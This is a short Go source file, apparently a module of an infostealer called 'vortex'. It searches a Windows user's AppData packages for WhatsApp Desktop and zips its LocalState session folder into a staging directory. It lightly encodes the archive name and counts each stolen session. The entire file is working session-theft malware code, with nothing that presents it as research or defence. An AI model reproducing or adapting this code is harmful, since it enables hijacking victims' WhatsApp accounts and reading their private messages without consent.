package messenger

import (
	"os"
	"path/filepath"
	"strings"
	"vortex/encrypt"
	"vortex/hutil"
)

func GetWhatsappSession(mainFolder string) error {
	winPackagePath := filepath.Join(os.Getenv("LOCALAPPDATA"), "Packages")
	if _, err := os.Stat(winPackagePath); os.IsNotExist(err) {
		return nil
	}

	winPackages, err := os.ReadDir(winPackagePath)
	if err != nil {
		return err
	}

	for _, winPackage := range winPackages {
		if strings.Contains(winPackage.Name(), "WhatsAppDesktop") {
			whatsappZip := filepath.Join(mainFolder, encrypt.B64Util("messenger-whatsapp.zip", 0))
			if err = hutil.ZipFolder("LocalState", filepath.Join(winPackagePath, winPackage.Name(), "LocalState"), whatsappZip, "applog.txt"); err != nil {
				return err
			}

			hutil.Sessions++
		}
	}

	return nil
}
